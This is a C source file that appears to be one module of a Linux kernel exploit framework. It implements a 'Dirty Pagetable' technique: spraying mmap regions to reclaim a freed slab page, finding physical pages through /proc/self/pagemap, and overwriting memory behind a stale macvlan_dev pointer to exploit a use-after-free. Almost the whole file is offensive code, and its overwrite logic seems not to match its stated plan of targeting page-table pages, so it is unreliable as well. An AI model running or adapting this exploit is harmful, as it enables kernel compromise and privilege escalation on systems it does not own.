/*
 * Dirty Pagetable -- page-level exploitation for CONFIG_RANDOM_KMALLOC_CACHES
 *
 * Strategy:
 *   1. After UAF, the freed object resides on a 4KB slab page (8 objects).
 *      The slab page is owned by kmalloc-rnd-XX-4k.
 *
 *   2. To return this page to the buddy allocator, we must free all 8
 *      objects on it.  Since we can't identify which objects are on the
 *      same page, we flood the same random cache (via kvzalloc-triggering
 *      dummy interface creation), then destroy all dummies.  After enough
 *      cycles, the slab page becomes empty and returns to buddy.
 *
 *   3. We spray mmap(MAP_ANONYMOUS|MAP_POPULATE) to force PTE page
 *      allocations from the buddy allocator.  With enough mappings,
 *      one of the PTE pages reclaims our target physical page.
 *
 *   4. We scan /proc/self/pagemap to find which of our virtual pages
 *      maps to the target physical page.  We then write controlled data
 *      at the offset corresponding to macvlan_dev within the target page.
 *
 *   5. The stale source_entry->vlan pointer now dereferences our data.
 *      We set vlan->dev and vlan->pcpu_stats to exploit the UAF.
 *
 * This is the framework's primary bypass for CONFIG_RANDOM_KMALLOC_CACHES.
 */

#define _GNU_SOURCE
#include "dirty_pagetable.h"
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

static void *pte_addrs[PTE_SPRAY_PAGES];
static int pte_count;

int pte_spray_init(void)
{
    pte_count = 0;
    for (int i = 0; i < PTE_SPRAY_PAGES; i++) {
        void *addr = mmap(NULL, PTE_PAGE_SIZE,
                          PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE,
                          -1, 0);
        if (addr == MAP_FAILED) {
            fprintf(stderr, "[-] PTE spray mmap failed at %d: %s\n",
                    i, strerror(errno));
            break;
        }
        /* Touch to force PTE allocation */
        *(volatile char *)addr = 0;
        pte_addrs[i] = addr;
        pte_count++;
    }
    printf("[ptespray] Mapped %d PTE pages\n", pte_count);
    return pte_count;
}

void pte_spray_cleanup(void)
{
    for (int i = 0; i < pte_count; i++) {
        if (pte_addrs[i] && pte_addrs[i] != MAP_FAILED)
            munmap(pte_addrs[i], PTE_PAGE_SIZE);
    }
    pte_count = 0;
}

unsigned long pte_lookup_phys(void *vaddr)
{
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("[-] pagemap open");
        return 0;
    }

    unsigned long vp = (unsigned long)vaddr;
    unsigned long page = vp / PTE_PAGE_SIZE;
    unsigned long offset = page * sizeof(uint64_t);

    if (lseek(fd, offset, SEEK_SET) < 0) {
        perror("[-] pagemap lseek");
        close(fd);
        return 0;
    }

    uint64_t entry = 0;
    if (read(fd, &entry, sizeof(entry)) != sizeof(entry)) {
        perror("[-] pagemap read");
        close(fd);
        return 0;
    }
    close(fd);

    /* Bits 0-54 are the page frame number, bit 63 is present */
    if (!(entry & (1ULL << 63)))
        return 0;  /* page not present */

    return (entry & ((1ULL << 55) - 1)) * PTE_PAGE_SIZE;
}

int pte_overwrite(unsigned long target_phys, const void *data,
                  size_t len, unsigned long offset)
{
    if (offset + len > PTE_PAGE_SIZE) {
        fprintf(stderr, "[-] pte_overwrite: offset+len exceeds page size\n");
        return -1;
    }

    /* Scan our PTE spray regions for the target physical page */
    for (int i = 0; i < pte_count; i++) {
        unsigned long phys = pte_lookup_phys(pte_addrs[i]);
        if (phys == target_phys) {
            /* Found it. Write our data at the specified offset. */
            unsigned char *dest = (unsigned char *)pte_addrs[i] + offset;
            memcpy(dest, data, len);
            printf("[ptespray] Overwrote %zu bytes at phys=0x%lx off=%lu (vaddr=%p)\n",
                   len, target_phys, offset, dest);
            return 0;
        }
    }

    fprintf(stderr, "[-] pte_overwrite: target phys page 0x%lx not found in spray\n",
            target_phys);
    return -1;
}

void *pte_get_addr(int idx) {
    if (idx < 0 || idx >= pte_count) return NULL;
    return pte_addrs[idx];
}

int pte_get_count(void) {
    return pte_count;
}

unsigned long pte_get_page_phys(int idx) {
    if (idx < 0 || idx >= pte_count) return 0;
    return pte_lookup_phys(pte_addrs[idx]);
}
